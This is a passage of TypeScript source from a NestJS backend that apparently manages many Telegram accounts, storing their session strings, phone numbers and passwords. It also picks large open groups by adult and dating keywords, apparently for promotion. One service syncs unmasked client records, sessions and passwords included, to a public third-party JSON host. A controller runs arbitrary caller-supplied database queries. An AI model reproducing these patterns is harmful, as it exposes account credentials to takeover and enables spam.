'class-validator';\n\nexport class CreateBufferClientDto {\n  @ApiProperty({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsString()\n  readonly tgId: string;\n\n  @ApiProperty({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsString()\n  readonly mobile: string;\n\n  @ApiProperty({\n    description: 'Date of the session',\n    example: '2023-06-22',\n  })\n  @IsString()\n  readonly availableDate: string;\n\n  @ApiProperty({\n    description: 'Session identifier',\n    example: 'session123',\n  })\n  @IsString()\n  readonly session: string;\n\n  @ApiProperty({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsNumber()\n  readonly channels: number;\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { IsString, IsBoolean, IsOptional, IsNumber } from 'class-validator';\n\nexport class SearchBufferClientDto {\n  @ApiPropertyOptional({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsOptional()\n  @IsString()\n  readonly tgId?: string;\n\n  @ApiPropertyOptional({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsOptional()\n  @IsString()\n  readonly mobile?: string;\n\n  @ApiPropertyOptional({\n    description: 'availableDate of the bufferClient',\n    example: '2023-06-22',\n  })\n  @IsOptional()\n  @IsString()\n  readonly availableDate?: string;\n\n  @ApiPropertyOptional({\n    description: 'Session identifier',\n    example: 'session123',\n  })\n  @IsOptional()\n  @IsString()\n  readonly session?: string;\n\n  @ApiPropertyOptional({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsNumber()\n  readonly channels?: number;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateBufferClientDto } from './create-buffer-client.dto';\n\nexport class UpdateBufferClientDto extends PartialType(CreateBufferClientDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\nexport type BufferClientDocument = BufferClient & Document;\n@Schema({ collection: 'bufferClients', versionKey: false, autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})  // Specify the collection name here\nexport class BufferClient {\n  @Prop({ required: true})\n  tgId: string;\n\n  @Prop({ required: true, unique: true })\n  mobile: string;\n  \n  @Prop({ required: true })\n  session: string;\n\n  @Prop({ required: true })\n  availableDate: string;\n\n  @Prop({ required: true, type: Number })\n  channels: number;\n}\n\nexport const BufferClientSchema = SchemaFactory.createForClass(BufferClient);\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { BuildService } from './build.service';\n\n@ApiTags('Build')\n@Controller('builds')\nexport class BuildController {\n  constructor(private readonly buildService: BuildService) {}\n\n  @Get()\n  @ApiOperation({ summary: 'Get build data' })\n  async findOne(): Promise<any>{\n    return this.buildService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update build' })\n  @ApiBody({type: Object})\n  async update( @Body() updateClientDto: any): Promise<any> {\n    return this.buildService.update( updateClientDto);\n  }\n\n}\n","import { Module, Global } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { BuildService } from './build.service';\nimport { BuildController } from './build.controller';\nimport { BuildSchema } from './builds.schema';\nimport { NpointModule } from '../n-point/npoint.module';\n\n@Global()\n@Module({\n  imports: [\n    BuildModule,\n    MongooseModule.forFeature([{ name: 'buildModule', collection: 'builds', schema: BuildSchema }]),\n    NpointModule,\n  ],\n  providers: [BuildService],\n  controllers: [BuildController],\n  exports: [BuildModule],\n})\nexport class BuildModule { }","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Build } from './builds.schema';\nimport { NpointService } from '../n-point/npoint.service';\n\n@Injectable()\nexport class BuildService {\n    constructor(@InjectModel('buildModule') private buildModel: Model<Build>,\n        private npointSerive: NpointService) {\n    }\n\n    async OnModuleInit() {\n        console.log(\"Config Module Inited\")\n    }\n\n    async findOne(): Promise<any> {\n        const user = await this.buildModel.findOne({}).exec();\n        if (!user) {\n            throw new NotFoundException(`buildModel not found`);\n        }\n        return user;\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.buildModel.findOneAndUpdate(\n            {}, // Assuming you want to update the first document found in the collection\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true }\n        ).exec();\n        try {\n            await this.npointSerive.updateDocument(\"3375d15db1eece560188\", updatedUser)\n            console.log(\"Updated document successfully in npoint\")\n        } catch (error) {\n            console.log(error)\n        }\n        if (!updatedUser) {\n            throw new NotFoundException(`buildModel not found`);\n        }\n        return updatedUser;\n    }\n\n}\n","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type BuildDocument = Build & Document;\n\n@Schema({versionKey: false, autoIndex: true,strict: false ,  timestamps: true,\n    toJSON: {\n      virtuals: true,\n      transform: (doc, ret) => {\n        delete ret._id;\n      },\n    },})\nexport class Build {}\n\nexport const BuildSchema = SchemaFactory.createForClass(Build);\nBuildSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","// src/channels/channels.controller.ts\nimport { Controller, Get, Post, Body, Patch, Param, Delete, NotFoundException, Query, BadRequestException } from '@nestjs/common';\nimport { ChannelsService } from './channels.service';\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery, ApiBody } from '@nestjs/swagger';\nimport { SearchChannelDto } from './dto/search-channel.dto';\nimport { CreateChannelDto } from './dto/create-channel.dto';\nimport { UpdateChannelDto } from './dto/update-channel.dto';\nimport { Channel } from './schemas/channel.schema';\n\n@ApiTags('Channels')\n@Controller('channels')\nexport class ChannelsController {\n  constructor(private readonly channelsService: ChannelsService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create a new  channel' })\n  async create(@Body() createChannelDto: CreateChannelDto) {\n    return this.channelsService.create(createChannelDto);\n  }\n  @Post('createMultiple')\n  @ApiOperation({ summary: 'Create multiple channels' })\n  @ApiBody({ type: [CreateChannelDto] })\n  async createMultiple(@Body() createChannelDtos: CreateChannelDto[]): Promise<string> {\n    return this.channelsService.createMultiple(createChannelDtos);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search channels by filters' })\n  @ApiQuery({ name: 'channelId', required: false, type: String })\n  @ApiQuery({ name: 'broadcast', required: false, type: Boolean })\n  @ApiQuery({ name: 'canSendMsgs', required: false, type: Boolean })\n  @ApiQuery({ name: 'participantsCount', required: false, type: Number })\n  @ApiQuery({ name: 'restricted', required: false, type: Boolean })\n  @ApiQuery({ name: 'sendMessages', required: false, type: Boolean })\n  @ApiQuery({ name: 'title', required: false, type: String })\n  @ApiQuery({ name: 'username', required: false, type: String })\n  search(@Query() query: SearchChannelDto): Promise<Channel[]> {\n    console.log(query);\n    return this.channelsService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all  channels' })\n  async findAll() {\n    return this.channelsService.findAll();\n  }\n\n  @Get(':channelId')\n  @ApiOperation({ summary: 'Get an  channel by channelId' })\n  //@apiresponse({ status: 200, description: 'Return the  channel', type: Channel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async findOne(@Param('channelId') channelId: string) {\n    return this.channelsService.findOne(channelId);\n  }\n\n  @Patch(':channelId')\n  @ApiOperation({ summary: 'Update an  channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully updated.', type: Channel })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async update(@Param('channelId') channelId: string, @Body() updateChannelDto: UpdateChannelDto) {\n    return this.channelsService.update(channelId, updateChannelDto);\n  }\n\n  @Delete(':channelId')\n  @ApiOperation({ summary: 'Delete an  channel by channelId' })\n  //@apiresponse({ status: 200, description: 'The channel has been successfully deleted.' })\n  //@apiresponse({ status: 404, description: 'Channel not found' })\n  async remove(@Param('channelId') channelId: string) {\n    return this.channelsService.remove(channelId);\n  }\n}\n","// src/channels/channels.module.ts\nimport { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { ChannelsService } from './channels.service';\nimport { ChannelsController } from './channels.controller';\nimport { Channel, ChannelSchema } from './schemas/channel.schema';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: Channel.name, schema: ChannelSchema }]),\n  ],\n  controllers: [ChannelsController],\n  providers: [ChannelsService],\n  exports: [ChannelsService]\n})\nexport class ChannelsModule { }\n","// src/channels/channels.service.ts\nimport { BadRequestException, Injectable, InternalServerErrorException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateChannelDto } from './dto/create-channel.dto';\nimport { UpdateChannelDto } from './dto/update-channel.dto';\nimport { Channel, ChannelDocument } from './schemas/channel.schema';\n@Injectable()\nexport class ChannelsService {\n  constructor(\n    @InjectModel(Channel.name) private ChannelModel: Model<ChannelDocument>,\n  ) { console.log(Channel.name) }\n\n  async create(createChannelDto: CreateChannelDto): Promise<Channel> {\n    const createdChannel = new this.ChannelModel(createChannelDto);\n    return createdChannel.save();\n  }\n\n  async createMultiple(createChannelDtos: CreateChannelDto[]): Promise<string> {\n    const bulkOps = createChannelDtos.map((dto) => ({\n      updateOne: {\n        filter: { channelId: dto.channelId },\n        update: { $set: dto },\n        upsert: true\n      }\n    }));\n\n    await this.ChannelModel.bulkWrite(bulkOps, { ordered: false });\n    return 'Channels Saved';\n  }\n\n  async findAll(): Promise<Channel[]> {\n    return this.ChannelModel.find().exec();\n  }\n\n  async findOne(channelId: string): Promise<Channel> {\n    const channel = (await this.ChannelModel.findOne({ channelId }).exec())?.toJSON();\n    return channel;\n  }\n\n  async update(channelId: string, updateChannelDto: UpdateChannelDto): Promise<Channel> {\n    const updatedChannel = await this.ChannelModel.findOneAndUpdate(\n      { channelId },\n      { $set: updateChannelDto },\n      { new: true, upsert: true },\n    ).exec();\n    return updatedChannel;\n  }\n\n  async remove(channelId: string): Promise<void> {\n    const result = await this.ChannelModel.findOneAndDelete({ channelId }).exec();\n  }\n\n  async search(filter: any): Promise<Channel[]> {\n    console.log(filter)\n    return this.ChannelModel.find(filter).exec();\n  }\n\n  async getChannels(limit = 50, skip = 0, keywords = [], notIds = []) {\n    const pattern = new RegExp(keywords.join('|'), 'i');\n    const notPattern = new RegExp('online|board|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser', \"i\")\n    let query = {\n      $and: [\n        { username: { $ne: null } },\n        {\n          $or: [\n            { title: { $regex: pattern } },\n            { username: { $regex: pattern } }\n          ]\n        },\n        {\n          username: {\n            $not: {\n              $regex: \"^(\" + notIds.map(id => \"(?i)\" + id?.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&'))?.join(\"|\") + \")$\"\n            }\n          }\n        },\n        {\n          title: { $not: { $regex: notPattern } }\n        },\n        {\n          username: { $not: { $regex: notPattern } }\n        },\n        {\n          sendMessages: false,\n          broadcast: false,\n          restricted: false\n        }\n      ]\n    };\n\n    const sort: { participantsCount: \"desc\" } = { participantsCount: \"desc\" };\n    try {\n      const result: Channel[] = await this.ChannelModel.find(query).sort(sort).skip(skip).limit(limit).exec();\n      return result;\n    } catch (error) {\n      console.error('Error:', error);\n      return [];\n    }\n  }\n\n  async executeQuery(query: any, sort?: any, limit?: number): Promise<Channel[]> {\n    try {\n      if (!query) {\n        throw new BadRequestException('Query is invalid.');\n      }\n      const queryExec = this.ChannelModel.find(query);\n      if (sort) {\n        queryExec.sort(sort);\n      }\n\n      if (limit) {\n        queryExec.limit(limit);\n      }\n\n      return await queryExec.exec();\n    } catch (error) {\n      throw new InternalServerErrorException(error.message);\n    }\n  }\n\n  async getActiveChannels(limit = 50, skip = 0, notIds = []) {\n    const query = {\n      '$and':\n        [\n          {\n            '$or':\n              [\n                { title: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n                { username: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\n              ]\n          },\n          {\n            '$or': [\n              { title: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\n              { username: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\n            ]\n          },\n          {\n            channelId: { '$nin': notIds },\n            participantsCount: { $gt: 1000 },\n            username: {$ne: null},\n            canSendMsgs: true,\n            restricted: false,\n            forbidden: false\n          }\n        ]\n    }\n\n    const sort: Record<string, 1 | -1> = notIds.length > 300 && false ? { randomField: 1 } : { participantsCount: -1 }\n    try {\n      const result: Channel[] = await this.ChannelModel.aggregate([\n        { $match: query },\n        { $skip: skip },\n        { $limit: limit },\n        { $addFields: { randomField: { $rand: {} } } }, // Add a random field\n        { $sort: sort }, // Sort by the random field\n        { $project: { randomField: 0 } } // Remove the random field from the output\n      ]).exec();\n      return result;\n    } catch (error) {\n      console.error('Error:', error);\n      return [];\n    }\n  }\n}\n","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateChannelDto {\n  @ApiProperty({\n    description: 'Unique identifier for the channel',\n    example: '803387987',\n  })\n  channelId: string;\n\n  @ApiProperty({\n    description: 'Whether the channel is a broadcast channel',\n    example: null,\n    required: false,\n  })\n  broadcast?: boolean;\n\n  @ApiProperty({\n    description: 'Indicates if the channel can send messages',\n    example: true,\n  })\n  canSendMsgs: boolean;\n\n  @ApiProperty({\n    description: 'Whether the channel is a megagroup',\n    example: null,\n    required: false,\n  })\n  megagroup?: boolean;\n\n  @ApiProperty({\n    description: 'Number of participants in the channel',\n    example: 0,\n  })\n  participantsCount: number;\n\n  @ApiProperty({\n    description: 'Whether the channel is restricted',\n    example: null,\n    required: false,\n  })\n  restricted?: boolean;\n\n  @ApiProperty({\n    description: 'Whether the channel can send messages',\n    example: null,\n    required: false,\n  })\n  sendMessages?: boolean;\n\n  @ApiProperty({\n    description: 'Title of the channel',\n    example: 'Earn money with Ayesha',\n  })\n  title: string;\n\n  @ApiProperty({\n    description: 'Username of the channel',\n    example: null,\n    required: false,\n  })\n  username?: string;\n\n  @ApiProperty({\n    description: 'Whether the channel is private',\n    example: false,\n    required: false,\n  })\n  private: boolean = false;\n\n  @ApiProperty({\n    default: false, example: false,\n    required: false,\n  })\n  forbidden: boolean = false;\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\n\nexport class SearchChannelDto {\n  @ApiPropertyOptional({\n    description: 'Unique identifier for the channel',\n    example: '803387987',\n  })\n  channelId?: string;\n\n  @ApiPropertyOptional({\n    description: 'Title of the channel',\n    example: 'Earn money with Ayesha',\n  })\n  title?: string;\n\n  @ApiPropertyOptional({\n    description: 'privacy of the channel',\n    example: false,\n  })\n  private?: string;\n\n  @ApiPropertyOptional({\n    description: 'Username of the channel',\n    example: 'ayesha_channel',\n  })\n  username?: string;\n\n  @ApiPropertyOptional({\n    description: 'Indicates if the channel can send messages',\n    example: true,\n  })\n  canSendMsgs?: boolean;\n\n  @ApiPropertyOptional({\n    description: 'Minimum number of participants in the channel',\n    example: 10,\n  })\n  minParticipantsCount?: number;\n\n  @ApiPropertyOptional({\n    description: 'Maximum number of participants in the channel',\n    example: 100,\n  })\n  maxParticipantsCount?: number;\n}\n","// src/channels/dto/update-channel.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateChannelDto } from './create-channel.dto';\n\nexport class UpdateChannelDto extends PartialType(CreateChannelDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\nimport * as mongoose from 'mongoose';\n\nexport type ChannelDocument = Channel & Document;\n@Schema({\n  collection: 'channels', versionKey: false, autoIndex: true, timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class Channel {\n  @Prop({ required: true, unique: true })\n  channelId: string;\n\n  @Prop({ default: false })\n  broadcast: boolean;\n\n  @Prop({ default: true })\n  canSendMsgs: boolean;\n\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  participantsCount: number;\n\n  @Prop({ default: false })\n  restricted: boolean;\n\n  @Prop({ default: false })\n  sendMessages: boolean;\n\n  @Prop({ required: true })\n  title: string;\n\n  @Prop({ required: false, default: null })\n  username: string;\n\n  @Prop({ required: true, default: false })\n  private: boolean;\n\n  @Prop({ default: false, required: false })\n  forbidden: boolean\n}\n\nexport const ChannelSchema = SchemaFactory.createForClass(Channel);\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, HttpException, HttpStatus } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody, ApiParam, ApiResponse, ApiQuery } from '@nestjs/swagger';\r\nimport { ClientService } from './client.service';\r\nimport { CreateClientDto } from './dto/create-client.dto';\r\nimport { Client } from './schemas/client.schema';\r\nimport { SearchClientDto } from './dto/search-client.dto';\r\nimport { UpdateClientDto } from './dto/update-client.dto';\r\nimport { SetupClientQueryDto } from './dto/setup-client.dto';\r\n\r\n@ApiTags('Clients')\r\n@Controller('clients')\r\nexport class ClientController {\r\n  constructor(private readonly clientService: ClientService) { }\r\n\r\n  /**\r\n   * Create a new client\r\n   */\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create user data' })\r\n  @ApiResponse({ status: 201, description: 'The user data has been successfully created.' })\r\n  @ApiResponse({ status: 400, description: 'Invalid input data.' })\r\n  async create(@Body() createClientDto: CreateClientDto): Promise<Client> {\r\n    try {\r\n      return await this.clientService.create(createClientDto);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Search for clients based on query parameters\r\n   */\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search user data' })\r\n  @ApiQuery({ name: 'clientId', required: false, description: 'Client ID' })\r\n  @ApiQuery({ name: 'dbcoll', required: false, description: 'Database collection name' })\r\n  @ApiQuery({ name: 'channelLink', required: false, description: 'Channel link' })\r\n  @ApiQuery({ name: 'link', required: false, description: 'Client link' })\r\n  @ApiResponse({ status: 200, description: 'Matching user data returned successfully.' })\r\n  async search(@Query() query: SearchClientDto): Promise<Client[]> {\r\n    try {\r\n      return await this.clientService.search(query);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  @Get('updateClient/:clientId')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\r\n  //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  async updateClient(@Param('clientId') clientId: string) {\r\n    this.clientService.updateClient(clientId);\r\n    return \"Update client initiated\";\r\n  }\r\n\r\n  /**\r\n   * Get all clients with masked sensitive fields\r\n   */\r\n  @Get('maskedCls')\r\n  @ApiOperation({ summary: 'Get all user data with masked fields' })\r\n  @ApiResponse({ status: 200, description: 'All user data returned successfully.' })\r\n  async findAllMasked(@Query() query: SearchClientDto) {\r\n    try {\r\n      return await this.clientService.findAllMasked(query);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Get all clients\r\n   */\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all user data' })\r\n  @ApiResponse({ status: 200, description: 'All user data returned successfully.' })\r\n  async findAll(): Promise<Client[]> {\r\n    try {\r\n      return await this.clientService.findAll();\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Get a specific client by ID\r\n   */\r\n  @Get(':clientId')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  @ApiResponse({ status: 200, description: 'User data returned successfully.' })\r\n  @ApiResponse({ status: 404, description: 'User data not found.' })\r\n  async findOne(@Param('clientId') clientId: string): Promise<Client> {\r\n    try {\r\n      return await this.clientService.findOne(clientId);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Update a specific client by ID\r\n   */\r\n  @Patch(':clientId')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  @ApiResponse({ status: 200, description: 'The user data has been successfully updated.' })\r\n  @ApiResponse({ status: 404, description: 'User data not found.' })\r\n  async update(@Param('clientId') clientId: string, @Body() updateClientDto: UpdateClientDto): Promise<Client> {\r\n    try {\r\n      return await this.clientService.update(clientId, updateClientDto);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Delete a specific client by ID\r\n   */\r\n  @Delete(':clientId')\r\n  @ApiOperation({ summary: 'Delete user data by ID' })\r\n  @ApiResponse({ status: 200, description: 'The user data has been successfully deleted.' })\r\n  @ApiResponse({ status: 404, description: 'User data not found.' })\r\n  async remove(@Param('clientId') clientId: string): Promise<Client> {\r\n    try {\r\n      return await this.clientService.remove(clientId);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  // @Get('setupClient/:clientId')\r\n  // @ApiOperation({ summary: 'SetUp Client data' })\r\n  // //@apiresponse({ status: 200, description: 'Return the user data.' })\r\n  // //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  // async setupClient(@Param('clientId') clientId: string, @Query() setupClientQueryDto: SetupClientQueryDto) {\r\n  //   this.clientService.setupClient(clientId, setupClientQueryDto);\r\n  //   return `Started Client Seup for ${clientId}`\r\n  // }\r\n\r\n  /**\r\n   * Execute a custom MongoDB query\r\n   */\r\n  @Post('query')\r\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\r\n  @ApiResponse({ status: 200, description: 'Query executed successfully.' })\r\n  @ApiResponse({ status: 400, description: 'Invalid query.' })\r\n  @ApiBody({ schema: { properties: { query: { type: 'object' }, sort: { type: 'object' }, limit: { type: 'number' }, skip: { type: 'number' } } } })\r\n  async executeQuery(@Body() requestBody: any): Promise<any> {\r\n    const { query, sort, limit, skip } = requestBody;\r\n    try {\r\n      return await this.clientService.executeQuery(query, sort, limit, skip);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Add a mobile number to the promoteMobile array for a specific client\r\n   */\r\n  @Patch(':clientId/promoteMobile/add')\r\n  @ApiOperation({ summary: 'Add a mobile number to the promoteMobile array for a specific client' })\r\n  @ApiParam({ name: 'clientId', description: 'The unique identifier of the client' })\r\n  @ApiBody({ schema: { properties: { mobileNumber: { type: 'string', example: '916265240911' } } } })\r\n  @ApiResponse({ status: 200, description: 'Mobile number added successfully.' })\r\n  @ApiResponse({ status: 404, description: 'Client not found.' })\r\n  async addPromoteMobile(@Param('clientId') clientId: string, @Body('mobileNumber') mobileNumber: string) {\r\n    try {\r\n      return await this.clientService.addPromoteMobile(clientId, mobileNumber);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Remove a mobile number from the promoteMobile array for a specific client\r\n   */\r\n  @Patch(':clientId/promoteMobile/remove')\r\n  @ApiOperation({ summary: 'Remove a mobile number from the promoteMobile array for a specific client' })\r\n  @ApiParam({ name: 'clientId', description: 'The unique identifier of the client' })\r\n  @ApiBody({ schema: { properties: { mobileNumber: { type: 'string', example: '916265240911' } } } })\r\n  @ApiResponse({ status: 200, description: 'Mobile number removed successfully.' })\r\n  @ApiResponse({ status: 404, description: 'Client not found.' })\r\n  async removePromoteMobile(@Param('clientId') clientId: string, @Body('mobileNumber') mobileNumber: string) {\r\n    try {\r\n      return await this.clientService.removePromoteMobile(clientId, mobileNumber);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n}\r\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { Client, ClientSchema } from './schemas/client.schema';\nimport { ClientService } from './client.service';\nimport { ClientController } from './client.controller';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\nimport { UsersModule } from '../users/users.module';\nimport { ArchivedClientModule } from '../archived-clients/archived-client.module';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { NpointModule } from '../n-point/npoint.module';\nimport { TimestampModule } from '../timestamps/timestamp.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: Client.name, schema: ClientSchema }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => BufferClientModule),\n    forwardRef(() => UsersModule),\n    forwardRef(() => ArchivedClientModule),\n    forwardRef(() => TimestampModule),\n    NpointModule\n  ],\n  controllers: [ClientController],\n  providers: [ClientService],\n  exports: [ClientService]\n})\nexport class ClientModule { }\n","import { TelegramService } from './../Telegram/Telegram.service';\nimport { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef, Query } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Client, ClientDocument } from './schemas/client.schema';\nimport { CreateClientDto } from './dto/create-client.dto';\nimport { SetupClientQueryDto } from './dto/setup-client.dto';\nimport { BufferClientService } from '../buffer-clients/buffer-client.service';\nimport { sleep } from 'telegram/Helpers';\nimport { UsersService } from '../users/users.service';\nimport { ArchivedClientService } from '../archived-clients/archived-client.service';\nimport { areJsonsNotSame, contains, fetchNumbersFromString, mapToJson, toBoolean } from '../../utils';\nimport { UpdateClientDto } from './dto/update-client.dto';\nimport { CreateBufferClientDto } from '../buffer-clients/dto/create-buffer-client.dto';\nimport { UpdateBufferClientDto } from '../buffer-clients/dto/update-buffer-client.dto';\nimport * as path from 'path';\nimport { CloudinaryService } from '../../cloudinary';\nimport { SearchClientDto } from './dto/search-client.dto';\nimport { NpointService } from '../n-point/npoint.service';\nimport axios from 'axios';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\nimport { connectionManager } from '../Telegram/utils/connection-manager';\n\nlet settingupClient = Date.now() - 250000;\n@Injectable()\nexport class ClientService {\n    private clientsMap: Map<string, Client> = new Map();\n    private lastUpdateMap: Map<string, number> = new Map(); // Track last update times\n    constructor(@InjectModel(Client.name) private clientModel: Model<ClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => BufferClientService))\n        private bufferClientService: BufferClientService,\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ArchivedClientService))\n        private archivedClientService: ArchivedClientService,\n        private npointSerive: NpointService\n    ) {\n        setInterval(async () => {\n            await this.refreshMap();\n        }, 5 * 60 * 1000);\n    }\n\n    async checkNpoint() {\n        const clients = (await axios.get('https://api.npoint.io/7c2682f37bb93ef486ba')).data;\n        for (const client in clients) {\n            const existingClient = await this.findOne(client, false);\n            if (areJsonsNotSame(existingClient, clients[client])) {\n                await this.findAll();\n                const clientData = mapToJson(this.clientsMap)\n                await this.npointSerive.updateDocument(\"7c2682f37bb93ef486ba\", clientData)\n                const maskedCls = {};\n                for (const client in clientData) {\n                    const { session, mobile, password, promoteMobile, ...maskedClient } = clientData[client];\n                    maskedCls[client] = maskedClient\n                }\n                await this.npointSerive.updateDocument(\"f0d1e44d82893490bbde\", maskedCls)\n                break;\n            }\n        }\n    }\n\n    async create(createClientDto: CreateClientDto): Promise<Client> {\n        const createdUser = new this.clientModel(createClientDto);\n        return createdUser.save();\n    }\n\n    async findAll(): Promise<Client[]> {\n        const clientMapLength = this.clientsMap.size\n        if (clientMapLength < 20) {\n            const results: Client[] = await this.clientModel.find({}, { _id: 0, updatedAt: 0 }).lean()\n            for (const client of results) {\n                this.clientsMap.set(client.clientId, client)\n            }\n            console.log(\"Refreshed Clients\")\n            return results\n        } else {\n            return Array.from(this.clientsMap.values())\n        }\n    }\n\n    async findAllMasked(query?: SearchClientDto) {\n        const allClients = await this.findAll()\n        const filteredClients = query\n            ? allClients.filter(client => {\n                return Object.keys(query).every(key => 